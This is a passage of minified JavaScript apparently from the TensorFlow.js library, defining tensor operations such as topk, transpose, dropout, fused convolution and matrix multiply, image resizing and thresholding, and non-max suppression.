        _l(n);
        const e = wi(n, t);
        if (1 !== e.length)
            throw new Error("tensor1d() requires values to be a flat/TypedArray");
        return Ci(n, null, e, t)
    }
    function Ad(n, t, e) {
        if (_l(n),
        null != t && 2 !== t.length)
            throw new Error("tensor2d() requires shape to have two numbers");
        const s = wi(n, e);
        if (2 !== s.length && 1 !== s.length)
            throw new Error("tensor2d() requires values to be number[][] or flat/TypedArray");
        if (1 === s.length && null == t)
            throw new Error("tensor2d() requires shape to be provided when `values` are a flat/TypedArray");
        return Ci(n, t, s, e)
    }
    function ng(n, t, e) {
        const s = t.rank > 1 ? t.shape[t.rank - 1] : 1
          , o = t.rank > 1 ? t.rank - 1 : 1
          , r = `Must have updates.shape = indices.shape[:batchDim] + shape[sliceDim:], got updates.shape: ${e.shape}, indices.shape: ${t.shape}, shape: ${n}, sliceDim: ${s}, and batchDim: ${o}.`;
        if (e.rank < o)
            throw new Error(r + ` update.rank < ${o}. `);
        if (n.length < s + (e.rank - o))
            throw new Error(r + ` Output shape length < ${s + (e.rank - o)}`);
        if (e.rank !== o + n.length - s)
            throw new Error(r + " update.rank != " + (o + n.length - s));
        for (let i = 0; i < o; ++i)
            if (e.shape[i] !== t.shape[i])
                throw new Error(r + ` updates.shape[${i}] (${e.shape[i]}) != indices.shape[${i}] (${t.shape[i]}).`);
        for (let i = 0; i < e.rank - o; ++i)
            if (e.shape[i + o] !== n[i + s])
                throw new Error(r + ` updates.shape[${i + o}] (${e.shape[i + o]}) != shape[${i + o}] (${n[i + o]})`)
    }
    function co(n, t, e) {
        const s = t.shape.length
          , o = s > 1 ? t.shape[s - 1] : 1
          , r = e.length;
        let i = 1;
        for (let d = o; d < r; ++d)
            i *= e[d];
        const a = o < 1 ? 1 : o;
        return {
            sliceRank: o,
            numUpdates: Z(t.shape) / a,
            sliceSize: i,
            strides: [...ct(e.slice(0, o)), 1],
            outputSize: Z(e)
        }
    }
    const uk = D({
        topk_: function lk(n, t=1, e=!0) {
            const s = N(n, "x", "topk");
            if (0 === s.rank)
                throw new Error("topk() expects the input to be of rank 1 or higher");
            const o = s.shape[s.shape.length - 1];
            if (t < 0)
                throw new Error(`'k' passed to topk() must be >= 0 but got ${t}`);
            if (t > o)
                throw new Error(`'k' passed to topk() must be <= the last dimension (${o}) but got ${t}`);
            const r = {
                x: s
            }
              , i = {
                k: t,
                sorted: e
            }
              , [a,c] = G.runKernel(Pu, r, i);
            return {
                values: a,
                indices: c
            }
        }
    });
    const sg = D({
        truncatedNormal_: function dk(n, t=0, e=1, s, o) {
            if (es(n),
            null != s && "bool" === s)
                throw new Error("Unsupported data type $ { dtype }");
            const r = new Hm(t,e,s,!0,o)
              , i = wt(n, s);
            for (let a = 0; a < i.values.length; a++)
                i.values[a] = r.nextValue();
            return i.toTensor()
        }
    });
    const pk = D({
        unique_: function hk(n, t=0) {
            const e = N(n, "x", "unique", "string_or_numeric");
            v(e.rank > 0, (()=>"The input tensor must be at least 1D"));
            const s = {
                x: e
            }
              , o = {
                axis: t
            }
              , [r,i] = G.runKernel(Ku, s, o);
            return {
                values: r,
                indices: i
            }
        }
    });
    const og = D({
        unsortedSegmentSum_: function fk(n, t, e) {
            const s = N(n, "x", "unsortedSegmentSum")
              , o = N(t, "segmentIds", "unsortedSegmentSum", "int32");
            v(Do(e), (()=>"numSegments must be of dtype int"));
            const r = {
                x: s,
                segmentIds: o
            }
              , i = {
                numSegments: e
            };
            return G.runKernel(bc, r, i)
        }
    });
    const lo = D({
        unstack_: function mk(n, t=0) {
            const e = N(n, "x", "unstack", "string_or_numeric");
            v(t >= -e.shape.length && t < e.shape.length, (()=>`Axis = ${t} is not in [-${e.shape.length}, ${e.shape.length})`));
            const s = {
                value: e
            }
              , o = {
                axis: t
            };
            return G.runKernel(gc, s, o)
        }
    });
    function rg(n, t) {
        const e = [];
        for (let r = 0; r < t.length; r++)
            t[r] && e.push(r);
        const s = wt(n, "int32")
          , o = wt([e.length, n.length], "int32");
        for (let r = 0; r < e.length; r++) {
            const i = s.indexToLoc(e[r])
              , a = r * n.length;
            o.values.set(i, a)
        }
        return o.toTensor()
    }
    const kt = D({
        transpose_: function bk(n, t, e) {
            const s = N(n, "x", "transpose");
            if (null == t && (t = s.shape.map(((i,a)=>a)).reverse()),
            v(s.rank === t.length, (()=>`Error in transpose: rank of input ${s.rank} must match length of perm ${t}.`)),
            t.forEach((i=>{
                v(i >= 0 && i < s.rank, (()=>`All entries in 'perm' must be between 0 and ${s.rank - 1} but got ${t}`))
            }
            )),
            s.rank <= 1)
                return s.clone();
            const o = {
                x: s
            }
              , r = {
                perm: t
            };
            return "complex64" === s.dtype ? M((()=>{
                let i = Vc(s)
                  , a = wd(s);
                return i = G.runKernel(zo, {
                    x: i
                }, r),
                a = G.runKernel(zo, {
                    x: a
                }, r),
                e && (a = ne(a)),
                Ko(i, a)
            }
            )) : G.runKernel(zo, o, r)
        }
    });
    const Ik = D({
        dropout_: function yk(n, t, e, s) {
            const o = N(n, "x", "dropout");
            if (v("float32" === o.dtype, (()=>`x has to be a floating point tensor since it's going to be scaled, but got a ${o.dtype} tensor instead.`)),
            v(t >= 0 && t < 1, (()=>`rate must be a float in the range [0, 1), but got ${t}.`)),
            0 === t)
                return n instanceof ae ? o.clone() : o;
            const r = function xk(n, t) {
                if (null == t)
                    return n.shape.slice();
                if (Rt(n.shape, t))
                    return t;
                if (n.shape.length === t.length) {
                    const e = [];
                    for (let s = 0; s < n.shape.length; s++)
                        null == t[s] && null != n.shape[s] ? e.push(n.shape[s]) : e.push(t[s]);
                    return e
                }
                return t
            }(o, e)
              , i = 1 - t
              , a = dt(Dc(Q(Li(r, 0, 1, "float32", s), i)), i);
            return E(o, a)
        }
    });
    const Pd = D({
        conv2DBackpropFilter_: function wk(n, t, e, s, o, r="NHWC", i) {
            let a = n;
            3 === n.rank && (a = W(n, [1, n.shape[0], n.shape[1], n.shape[2]]));
            let c = t;
            3 === c.rank && (c = W(t, [1, t.shape[0], t.shape[1], t.shape[2]])),
            v(4 === a.rank, (()=>`Error in conv2dDerFilter: input must be rank 4, but got shape ${a.shape}.`)),
            v(4 === c.rank, (()=>`Error in conv2dDerFilter: dy must be rank 4, but got shape ${c.shape}.`)),
            v(4 === e.length, (()=>`Error in conv2dDerFilter: filterShape must be length 4, but got ${e}.`));
            const l = "NHWC" === r ? a.shape[3] : a.shape[1]
              , u = "NHWC" === r ? c.shape[3] : c.shape[1];
            v(l === e[2], (()=>`Error in conv2dDerFilter: depth of input ${l}) must match input depth in filter (${e[2]}.`)),
            v(u === e[3], (()=>`Error in conv2dDerFilter: depth of dy (${u}) must match output depth for filter (${e[3]}).`)),
            ze("conv2dDerFilter", o, i);
            const d = {
                x: a,
                dy: c
            }
              , h = {
                strides: s,
                pad: o,
                dataFormat: r,
                dimRoundingMode: i,
                filterShape: e
            };
            return G.runKernel(uu, d, h)
        }
    });
    function Od(n, t, e) {
        if (null == e || "linear" === e)
            return n;
        if ("relu" === e)
            return E(n, Wi(t));
        throw new Error(`Cannot compute gradient for fused activation ${e}.`)
    }
    function Kd(n, t) {
        let e = t;
        const s = ce(n.shape, t.shape);
        return s.length > 0 && (e = ut(e, s)),
        W(e, n.shape)
    }
    function Zd(n, t, e, s) {
        if ("linear" === t)
            return n;
        if ("relu" === t)
            return io(n);
        if ("elu" === t)
            return Gc(n);
        if ("relu6" === t)
            return _m(n);
        if ("prelu" === t)
            return Rd(n, e);
        if ("leakyrelu" === t)
            return Cd(n, s);
        if ("sigmoid" === t)
            return _o(n);
        throw new Error(`Unknown fused activation ${t}.`)
    }
    const Bd = (n,t)=>!(n > 0) || "linear" === t;
    const vk = D({
        fusedConv2d_: function Ck({x: n, filter: t, strides: e, pad: s, dataFormat: o="NHWC", dilations: r=[1, 1], dimRoundingMode: i, bias: a, activation: c="linear", preluActivationWeights: l, leakyreluAlpha: u}) {
            if (c = c || "linear",
            !1 === Bd(G.state.gradientDepth, c)) {
                v("NHWC" === o, (()=>`Error in fused conv2d: got dataFormat of ${o} but only NHWC is currently supported for the case of gradient depth is 0 and the activation is not linear.`));
                let C = so(n, t, e, s, o, r, i);
                return null != a && (C = Q(C, a)),
                Zd(C, c, l, u)
            }
            const d = N(n, "x", "conv2d", "float32")
              , h = N(t, "filter", "conv2d", "float32");
            let p = d
              , f = !1;
            3 === d.rank && (f = !0,
            p = W(d, [1, d.shape[0], d.shape[1], d.shape[2]])),
            v(4 === p.rank, (()=>`Error in fused conv2d: input must be rank 4, but got rank ${p.rank}.`)),
            v(4 === h.rank, (()=>`Error in fused conv2d: filter must be rank 4, but got rank ${h.rank}.`)),
            ze("fused conv2d", s, i);
            const m = "NHWC" === o ? p.shape[3] : p.shape[1];
            v(h.shape[2] === m, (()=>`Error in conv2d: depth of input (${m}) must match input depth for filter ${h.shape[2]}.`)),
            v(Te(e, r), (()=>`Error in conv2D: Either strides or dilations must be 1. Got strides ${e} and dilations '${r}'`));
            const g = ye(p.shape, h.shape, e, r, s, i);
            let b, x;
            if (null != a && (b = N(a, "bias", "fused conv2d"),
            [b] = te(b, d),
            "NHWC" === o ? gt(g.outShape, b.shape) : (v(b.shape.length <= 1, (()=>`Error in fused conv2d: only supports scalar or 1-D Tensor bias for NCHW format but got the bias of rank-${b.shape.length}.`)),
            v(0 === b.shape.length || b.shape[0] === g.outChannels || 1 === b.shape[0], (()=>`Error in fused conv2d: bias shape (${b.shape}) is not compatible with the number of output channels (${g.outChannels})`)))),
            null != l) {
                const C = l.shape;
                if (v(C.length <= 1 || 3 === C.length, (()=>`Error in fused conv2d: only supports scalar, 1-D Tensor or 3-D Tensor PReLU activation weights but got a tensor of rank-${C.length}.`)),
                1 === C.length)
                    v(1 === C[0] || C[0] === g.outChannels, (()=>`Error in fused conv2d: PReLU activation weights (${C}) is not compatible with the number of output channels (${g.outChannels}).`));
                else if (3 === C.length)
                    try {
                        gt(C, g.outShape)
                    } catch {
                        const S = `Error in fused conv2d: PReLU activation weights (${C}) is not compatible with the output shape of the conv2d (${g.outShape}).`;
                        throw Error(S)
                    }
                x = N(l, "prelu weights", "fused conv2d")
            }
            const I = (C,k)=>{
                v("NHWC" === o, (()=>`Error in gradient of fused conv2D: got dataFormat of ${o} but only NHWC is currently supported.`));
                const [S,T,R,L] = k
                  , V = Od(C, R, c);
                v(eo(r), (()=>`Error in gradient of fused conv2D: dilation rates greater than 1 are not yet supported in gradients. Got dilations '${r}'`));
                const A = [md(T.shape, V, S, e, s), Pd(T, V, S.shape, e, s)];
                if (null != L) {
                    const P = Kd(L, V);
                    A.push(P)
                }
                return A
            }
              , y = {
                x: p,
                filter: h,
                bias: b,
                preluActivationWeights: x
            }
              , w = {
                strides: e,
                pad: s,
                dataFormat: o,
                dilations: r,
                dimRoundingMode: i,
                activation: c,
                leakyreluAlpha: u
            };
            return null == a ? Jo(((k,S,T)=>{
                let R = G.runKernel(Ic, y, w);
                return T([S, k, R]),
                f && (R = W(R, [R.shape[1], R.shape[2], R.shape[3]])),
                {
                    value: R,
                    gradFunc: I
                }
            }
            ))(p, h) : Jo(((k,S,T,R)=>{
                let L = G.runKernel(Ic, y, w);
                return R([S, k, L, T]),
                f && (L = W(L, [L.shape[1], L.shape[2], L.shape[3]])),
                {
                    value: L,
                    gradFunc: I
                }
            }
            ))(p, h, b)
        }
    });
    const kk = D({
        depthwiseConv2dNativeBackpropFilter_: function Sk(n, t, e, s, o, r=[1, 1], i) {
            let a = n;
            3 === n.rank && (a = W(n, [1, n.shape[0], n.shape[1], n.shape[2]]));
            let c = t;
            3 === c.rank && (c = W(t, [1, t.shape[0], t.shape[1], t.shape[2]]));
            const l = {
                x: a,
                dy: c
            }
              , u = {
                strides: s,
                pad: o,
                dimRoundingMode: i,
                dilations: r,
                filterShape: e
            };
            return G.runKernel(bu, l, u)
        }
    });
    const Nk = D({
        depthwiseConv2dNativeBackpropInput_: function Tk(n, t, e, s, o, r=[1, 1], i) {
            let a = t
              , c = !1;
            3 === t.rank && (c = !0,
            a = W(t, [1, t.shape[0], t.shape[1], t.shape[2]]));
            const l = {
                dy: a,
                filter: e
            }
              , u = {
                strides: s,
                pad: o,
                dimRoundingMode: i,
                dilations: r,
                inputShape: n
            }
              , d = G.runKernel(xu, l, u);
            return c ? W(d, [d.shape[1], d.shape[2], d.shape[3]]) : d
        }
    });
    const ig = D({
        fusedMatMul_: function Rk({a: n, b: t, transposeA: e=!1, transposeB: s=!1, bias: o, activation: r="linear", preluActivationWeights: i, leakyreluAlpha: a=.2}) {
            if (!1 === Bd(G.state.gradientDepth, r)) {
                let L = $t(n, t, e, s);
                return null != o && (L = Q(L, o)),
                Zd(L, r, i, a)
            }
            let c = N(n, "a", "fused matMul")
              , l = N(t, "b", "fused matMul");
            [c,l] = te(c, l);
            const u = e ? c.shape[c.rank - 2] : c.shape[c.rank - 1]
              , d = s ? l.shape[l.rank - 1] : l.shape[l.rank - 2]
              , h = e ? c.shape[c.rank - 1] : c.shape[c.rank - 2]
              , p = s ? l.shape[l.rank - 2] : l.shape[l.rank - 1]
              , f = c.shape.slice(0, -2)
              , m = l.shape.slice(0, -2)
              , g = Z(f)
              , b = Z(m);
            v(u === d, (()=>`Error in fused matMul: inner shapes (${u}) and (${d}) of Tensors with shapes ${c.shape} and ${l.shape} and transposeA=${e} and transposeB=${s} must match.`));
            const I = gt(c.shape.slice(0, -2), l.shape.slice(0, -2)).concat([h, p])
              , y = W(c, e ? [g, u, h] : [g, h, u])
              , w = W(l, s ? [b, p, d] : [b, d, p]);
            let C, k;
            null != o && (C = N(o, "bias", "fused matMul"),
            [C] = te(C, c),
            gt(I, C.shape)),
            null != i && (k = N(i, "prelu weights", "fused matMul"));
            const S = (L,V)=>{
                const [F,X,A,P] = V
                  , B = Od(W(L, A.shape), A, r);
                let K, H;
                if (e || s ? !e && s ? (K = $t(B, X, !1, !1),
                H = $t(B, F, !0, !1)) : e && !s ? (K = $t(X, B, !1, !0),
                H = $t(F, B, !1, !1)) : (K = $t(X, B, !0, !0),
                H = $t(B, F, !0, !0)) : (K = $t(B, X, !1, !0),
                H = $t(F, B, !0, !1)),
                null != o) {
                    return [K, H, Kd(P, B)]
                }
                return [K, H]
            }
              , T = {
                a: y,
                b: w,
                bias: C,
                preluActivationWeights: k
            }
              , R = {
                transposeA: e,
                transposeB: s,
                activation: r,
                leakyreluAlpha: a
            };
            return null == o ? Jo(((V,F,X)=>{
                const A = G.runKernel(yc, T, R);
                return X([V, F, A]),
                {
                    value: W(A, I),
                    gradFunc: S
                }
            }
            ))(y, w) : Jo(((V,F,X,A)=>{
                const P = G.runKernel(yc, T, R);
                return A([V, F, P, X]),
                {
                    value: W(P, I),
                    gradFunc: S
                }
            }
            ))(y, w, C)
        }
    });
    const Gk = D({
        cropAndResize_: function $k(n, t, e, s, o="bilinear", r=0) {
            const i = N(n, "image", "cropAndResize")
              , a = N(t, "boxes", "cropAndResize", "float32")
              , c = N(e, "boxInd", "cropAndResize", "int32")
              , l = a.shape[0];
            v(4 === i.rank, (()=>`Error in cropAndResize: image must be rank 4,but got rank ${i.rank}.`)),
            v(2 === a.rank && 4 === a.shape[1], (()=>`Error in cropAndResize: boxes must be have size [${l},4] but had shape ${a.shape}.`)),
            v(1 === c.rank && c.shape[0] === l, (()=>`Error in cropAndResize: boxInd must be have size [${l}] but had shape ${a.shape}.`)),
            v(2 === s.length, (()=>`Error in cropAndResize: cropSize must be of length 2, but got length ${s.length}.`)),
            v(s[0] >= 1 && s[1] >= 1, (()=>`cropSize must be atleast [1,1], but was ${s}`)),
            v("bilinear" === o || "nearest" === o, (()=>`method must be bilinear or nearest, but was ${o}`));
            const u = {
                image: i,
                boxes: a,
                boxInd: c
            }
              , d = {
                method: o,
                extrapolationValue: r,
                cropSize: s
            };
            return G.runKernel(fu, u, d)
        }
    });
    const Ek = D({
        flipLeftRight_: function Lk(n) {
            const t = N(n, "image", "flipLeftRight", "float32");
            v(4 === t.rank, (()=>`Error in flipLeftRight: image must be rank 4,but got rank ${t.rank}.`));
            const e = {
                image: t
            };
            return G.runKernel(ku, e, {})
        }
    });
    const Wk = D({
        grayscaleToRGB_: function Dk(n) {
            const t = N(n, "image", "grayscaleToRGB")
              , e = t.rank - 1
              , s = t.shape[e];
            v(t.rank >= 2, (()=>`Error in grayscaleToRGB: images must be at least rank 2, but got rank ${t.rank}.`)),
            v(1 === s, (()=>`Error in grayscaleToRGB: last dimension of a grayscale image should be size 1, but got size ${s}.`));
            const o = new Array(t.rank);
            return o.fill(1, 0, e),
            o[e] = 3,
            Nn(t, o)
        }
    });
    const Vk = D({
        rgbToGrayscale_: function Mk(n) {
            const t = N(n, "image", "RGBToGrayscale")
              , e = t.rank - 1
              , s = t.shape[e];
            v(t.rank >= 2, (()=>`Error in RGBToGrayscale: images must be at least rank 2, but got rank ${t.rank}.`)),
            v(3 === s, (()=>`Error in RGBToGrayscale: last dimension of an RGB image should be size 3, but got size ${s}.`));
            const o = t.dtype
              , r = st(t, "float32")
              , i = Ue([.2989, .587, .114]);
            let a;
            switch (t.rank) {
            case 2:
                a = Ri("ij,j->i", r, i);
                break;
            case 3:
                a = Ri("ijk,k->ij", r, i);
                break;
            case 4:
                a = Ri("ijkl,l->ijk", r, i);
                break;
            case 5:
                a = Ri("ijklm,m->ijkl", r, i);
                break;
            case 6:
                a = Ri("ijklmn,n->ijklm", r, i);
                break;
            default:
                throw new Error("Not a valid tensor rank.")
            }
            return a = Ae(a, -1),
            st(a, o)
        }
    });
    const zk = D({
        rotateWithOffset_: function Fk(n, t, e=0, s=.5) {
            const o = N(n, "image", "rotateWithOffset", "float32");
            v(4 === o.rank, (()=>`Error in rotateWithOffset: image must be rank 4,but got rank ${o.rank}.`));
            const r = {
                image: o
            }
              , i = {
                radians: t,
                fillValue: e,
                center: s
            };
            return G.runKernel(Bu, r, i)
        }
    });
    function jo(n, t, e, s, o, r) {
        null == s && (s = .5),
        null == o && (o = Number.NEGATIVE_INFINITY),
        null == r && (r = 0);
        const i = n.shape[0];
        return e = Math.min(e, i),
        v(0 <= s && s <= 1, (()=>`iouThreshold must be in [0, 1], but was '${s}'`)),
        v(2 === n.rank, (()=>`boxes must be a 2D tensor, but was of rank '${n.rank}'`)),
        v(4 === n.shape[1], (()=>`boxes must have 4 columns, but 2nd dimension was ${n.shape[1]}`)),
        v(1 === t.rank, (()=>"scores must be a 1D tensor")),
        v(t.shape[0] === i, (()=>`scores has incompatible shape with boxes. Expected ${i}, but was ${t.shape[0]}`)),
        v(0 <= r && r <= 1, (()=>`softNmsSigma must be in [0, 1], but was '${r}'`)),
        {
            maxOutputSize: e,
            iouThreshold: s,
            scoreThreshold: o,
            softNmsSigma: r
        }
    }
    const Ak = D({
        nonMaxSuppression_: function Xk(n, t, e, s=.5, o=Number.NEGATIVE_INFINITY) {
            const r = N(n, "boxes", "nonMaxSuppression", "float32")
              , i = N(t, "scores", "nonMaxSuppression", "float32")
              , a = jo(r, i, e, s, o)
              , c = {
                maxOutputSize: e = a.maxOutputSize,
                iouThreshold: s = a.iouThreshold,
                scoreThreshold: o = a.scoreThreshold
            };
            return G.runKernel(Lu, {
                boxes: r,
                scores: i
            }, c)
        }
    });
    function Pk(n, t, e) {
        const s = function Ok(n, t, e) {
            return function Zk(n, t, e) {
                let s = 0
                  , o = n.length
                  , r = 0
                  , i = !1;
                for (; s < o; ) {
                    r = s + (o - s >>> 1);
                    const a = e(t, n[r]);
                    a > 0 ? s = r + 1 : (o = r,
                    i = !a)
                }
                return i ? s : -s - 1
            }(n, t, e || Kk)
        }(n, t, e)
          , o = s < 0 ? -(s + 1) : s;
        n.splice(o, 0, t)
    }
    function Kk(n, t) {
        return n > t ? 1 : n < t ? -1 : 0
    }
    function Hd(n, t, e, s, o) {
        return Yd(n, t, e, s, o, 0)
    }
    function _d(n, t, e, s, o, r) {
        return Yd(n, t, e, s, o, 0, !1, r, !0)
    }
    function Ud(n, t, e, s, o, r) {
        return Yd(n, t, e, s, o, r, !0)
    }
    function Yd(n, t, e, s, o, r, i=!1, a=!1, c=!1) {
        const l = [];
        for (let g = 0; g < t.length; g++)
            t[g] > o && l.push({
                score: t[g],
                boxIndex: g,
                suppressBeginIndex: 0
            });
        l.sort(ag);
        const u = r > 0 ? -.5 / r : 0
          , d = []
          , h = [];
        for (; d.length < e && l.length > 0; ) {
            const g = l.pop()
              , {score: b, boxIndex: x, suppressBeginIndex: I} = g;
            if (b < o)
                break;
            let y = !1;
            for (let w = d.length - 1; w >= I; --w) {
                const C = Bk(n, x, d[w]);
                if (C >= s) {
                    y = !0;
                    break
                }
                if (g.score = g.score * Hk(s, u, C),
                g.score <= o)
                    break
            }
            g.suppressBeginIndex = d.length,
            y || (g.score === b ? (d.push(x),
            h.push(g.score)) : g.score > o && Pk(l, g, ag))
        }
        const p = d.length
          , f = e - p;
        a && f > 0 && (d.push(...new Array(f).fill(0)),
        h.push(...new Array(f).fill(0)));
        const m = {
            selectedIndices: d
        };
        return i && (m.selectedScores = h),
        c && (m.validOutputs = p),
        m
    }
    function Bk(n, t, e) {
        const s = n.subarray(4 * t, 4 * t + 4)
          , o = n.subarray(4 * e, 4 * e + 4)
          , r = Math.min(s[0], s[2])
          , i = Math.min(s[1], s[3])
          , a = Math.max(s[0], s[2])
          , c = Math.max(s[1], s[3])
          , l = Math.min(o[0], o[2])
          , u = Math.min(o[1], o[3])
          , d = Math.max(o[0], o[2])
          , h = Math.max(o[1], o[3])
          , p = (a - r) * (c - i)
          , f = (d - l) * (h - u);
        if (p <= 0 || f <= 0)
            return 0;
        const m = Math.max(r, l)
          , g = Math.max(i, u)
          , b = Math.min(a, d)
          , x = Math.min(c, h)
          , I = Math.max(b - m, 0) * Math.max(x - g, 0);
        return I / (p + f - I)
    }
    function Hk(n, t, e) {
        const s = Math.exp(t * e * e);
        return e <= n ? s : 0
    }
    function ag(n, t) {
        return n.score - t.score || n.score === t.score && t.boxIndex - n.boxIndex
    }
    const Uk = async function _k(n, t, e, s=.5, o=Number.NEGATIVE_INFINITY) {
        const r = N(n, "boxes", "nonMaxSuppressionAsync")
          , i = N(t, "scores", "nonMaxSuppressionAsync")
          , a = jo(r, i, e, s, o);
        e = a.maxOutputSize,
        s = a.iouThreshold,
        o = a.scoreThreshold;
        const c = await Promise.all([r.data(), i.data()])
          , l = c[0]
          , u = c[1]
          , {selectedIndices: d} = Hd(l, u, e, s, o);
        return r !== n && r.dispose(),
        i !== t && i.dispose(),
        Ue(d, "int32")
    };
    const Qk = D({
        nonMaxSuppressionWithScore_: function Yk(n, t, e, s=.5, o=Number.NEGATIVE_INFINITY, r=0) {
            const i = N(n, "boxes", "nonMaxSuppression")
              , a = N(t, "scores", "nonMaxSuppression")
              , c = jo(i, a, e, s, o, r)
              , l = {
                boxes: i,
                scores: a
            }
              , u = {
                maxOutputSize: e = c.maxOutputSize,
                iouThreshold: s = c.iouThreshold,
                scoreThreshold: o = c.scoreThreshold,
                softNmsSigma: r = c.softNmsSigma
            }
              , d = G.runKernel(Du, l, u);
            return {
                selectedIndices: d[0],
                selectedScores: d[1]
            }
        }
    });
    const jk = async function Jk(n, t, e, s=.5, o=Number.NEGATIVE_INFINITY, r=0) {
        const i = N(n, "boxes", "nonMaxSuppressionAsync")
          , a = N(t, "scores", "nonMaxSuppressionAsync")
          , c = jo(i, a, e, s, o, r);
        e = c.maxOutputSize,
        s = c.iouThreshold,
        o = c.scoreThreshold,
        r = c.softNmsSigma;
        const l = await Promise.all([i.data(), a.data()])
          , u = l[0]
          , d = l[1]
          , {selectedIndices: h, selectedScores: p} = Ud(u, d, e, s, o, r);
        return i !== n && i.dispose(),
        a !== t && a.dispose(),
        {
            selectedIndices: Ue(h, "int32"),
            selectedScores: Ue(p)
        }
    };
    const tT = D({
        nonMaxSuppressionPadded_: function qk(n, t, e, s=.5, o=Number.NEGATIVE_INFINITY, r=!1) {
            const i = N(n, "boxes", "nonMaxSuppression")
              , a = N(t, "scores", "nonMaxSuppression")
              , c = jo(i, a, e, s, o, null)
              , h = {
                boxes: i,
                scores: a
            }
              , p = {
                maxOutputSize: c.maxOutputSize,
                iouThreshold: c.iouThreshold,
                scoreThreshold: c.scoreThreshold,
                padToMaxOutputSize: r
            }
              , f = G.runKernel(Eu, h, p);
            return {
                selectedIndices: f[0],
                validOutputs: f[1]
            }
        }
    });
    const nT = async function eT(n, t, e, s=.5, o=Number.NEGATIVE_INFINITY, r=!1) {
        const i = N(n, "boxes", "nonMaxSuppressionAsync")
          , a = N(t, "scores", "nonMaxSuppressionAsync")
          , c = jo(i, a, e, s, o, null)
          , l = c.maxOutputSize
          , u = c.iouThreshold
          , d = c.scoreThreshold
          , [h,p] = await Promise.all([i.data(), a.data()])
          , {selectedIndices: f, validOutputs: m} = _d(h, p, l, u, d, r);
        return i !== n && i.dispose(),
        a !== t && a.dispose(),
        {
            selectedIndices: Ue(f, "int32"),
            validOutputs: Gt(m, "int32")
        }
    };
    const cg = D({
        resizeBilinear_: function sT(n, t, e=!1, s=!1) {
            const o = N(n, "images", "resizeBilinear");
            v(3 === o.rank || 4 === o.rank, (()=>`Error in resizeBilinear: x must be rank 3 or 4, but got rank ${o.rank}.`)),
            v(2 === t.length, (()=>`Error in resizeBilinear: new shape must 2D, but got shape ${t}.`)),
            v(!1 === s || !1 === e, (()=>"Error in resizeBilinear: If halfPixelCenters is true, alignCorners must be false."));
            let r = o
              , i = !1;
            3 === o.rank && (i = !0,
            r = W(o, [1, o.shape[0], o.shape[1], o.shape[2]]));
            const a = {
                images: r
            }
              , c = {
                alignCorners: e,
                halfPixelCenters: s,
                size: t
            }
              , l = G.runKernel(cc, a, c);
            return i ? W(l, [l.shape[1], l.shape[2], l.shape[3]]) : l
        }
    });
    const lg = D({
        resizeNearestNeighbor_: function oT(n, t, e=!1, s=!1) {
            const o = N(n, "images", "resizeNearestNeighbor");
            v(3 === o.rank || 4 === o.rank, (()=>`Error in resizeNearestNeighbor: x must be rank 3 or 4, but got rank ${o.rank}.`)),
            v(2 === t.length, (()=>`Error in resizeNearestNeighbor: new shape must 2D, but got shape ${t}.`)),
            v("float32" === o.dtype || "int32" === o.dtype, (()=>"`images` must have `int32` or `float32` as dtype")),
            v(!1 === s || !1 === e, (()=>"Error in resizeNearestNeighbor: If halfPixelCenters is true, alignCorners must be false."));
            let r = o
              , i = !1;
            3 === o.rank && (i = !0,
            r = W(o, [1, o.shape[0], o.shape[1], o.shape[2]]));
            const a = {
                images: r
            }
              , c = {
                alignCorners: e,
                halfPixelCenters: s,
                size: t
            }
              , l = G.runKernel(ac, a, c);
            return i ? W(l, [l.shape[1], l.shape[2], l.shape[3]]) : l
        }
    });
    const aT = D({
        threshold_: function rT(n, t="binary", e=!1, s=.5) {
            const o = N(n, "image", "threshold")
              , c = o.shape[0] * o.shape[1];
            let u, d, h, p, l = E(Ue([s]), 255);
            if (v(3 === o.rank, (()=>`Error in threshold: image must be rank 3,but got rank ${o.rank}.`)),
            v(3 === o.shape[2] || 1 === o.shape[2], (()=>`Error in threshold: image color channel must be equal to 3 or 1but got ${o.shape[2]}.`)),
            v("int32" === o.dtype || "float32" === o.dtype, (()=>`Error in dtype: image dtype must be int32 or float32,but got dtype ${o.dtype}.`)),
            v("otsu" === t || "binary" === t, (()=>`Method must be binary or otsu, but was ${t}`)),
            3 === o.shape[2]) {
                [u,d,h] = on(o, [1, 1, 1], -1);
                const g = E(u, .2989)
                  , b = E(d, .587)
                  , x = E(h, .114);
                p = Q(Q(g, b), x)
            } else
                p = n;
            if ("otsu" === t) {
                l = function iT(n, t) {
                    let r, i, a, c, l, u, e = Ue([-1]), s = Ue([0]), o = Ue([0]);
                    for (let d = 0; d < n.size - 1; d++) {
                        r = Xt(n, 0, d + 1),
                        i = Xt(n, d + 1),
                        l = dt(ut(r), t),
                        u = dt(ut(i), t);
                        const h = ut(E(r, Ei(0, r.size)));
                        a = dt(h, ut(r));
                        const p = $c(i.shape, r.size)
                          , f = Q(Ei(0, i.size), p)
                          , m = E(i, f);
                        c = dt(ut(m), ut(i));
                        const g = pt(a, c)
                          , b = pt(a, c)
                          , x = E(l, u);
                        o = E(E(x, g), b);
                        const I = sn(o, s);
                        s = Le(I, o, s),
                        e = Le(I, Ue([d]), e)
                    }
                    return e
                }(o2(st(Um(p), "int32"), tn([]), 256), c)
            }
            const f = e ? Qo(p, l) : sn(p, l);
            return st(E(f, 255), "int32")
        }
    });
    const lT = D({
        transform_: function cT(n, t, e="nearest", s="constant", o=0, r) {
            const i = N(n, "image", "transform", "float32")
              , a = N(t, "transforms", "transform", "float32");
            v(4 === i.rank, (()=>`Error in transform: image must be rank 4,but got rank ${i.rank}.`)),
            v(2 === a.rank && (a.shape[0] === i.shape[0] || 1 === a.shape[0]) && 8 === a.shape[1], (()=>"Error in transform: Input transform should be batch x 8 or 1 x 8")),
            v(null == r || 2 === r.length, (()=>`Error in transform: outputShape must be [height, width] or null, but got ${r}.`));
            const c = {
                image: i,
                transforms: a
            }
              , l = {
                interpolation: e,
                fillMode: s,
                fillValue: o,
                outputShape: r
            };
            return G.runKernel(Ou, c, l)
        }
    });
    const dT = D({
        bandPart_: function uT(n, t, e) {
            const s = N(n, "a", "bandPart");
            v(s.rank >= 2, (()=>`bandPart(): Rank must be at least 2, got ${s.rank}.`));
            const o = s.shape
              , [r,i] = s.shape.slice(-2);
            let a, c;
            "number" == typeof t ? (v(t % 1 == 0, (()=>`bandPart(): numLower must be an integer, got ${t}.`)),
            v(t <= r, (()=>`bandPart(): numLower (${t}) must not be greater than the number of rows (${r}).`)),
            a = N(t < 0 ? r : t, "numLower", "bandPart")) : (v("int32" === t.dtype, (()=>"bandPart(): numLower's dtype must be an int32.")),
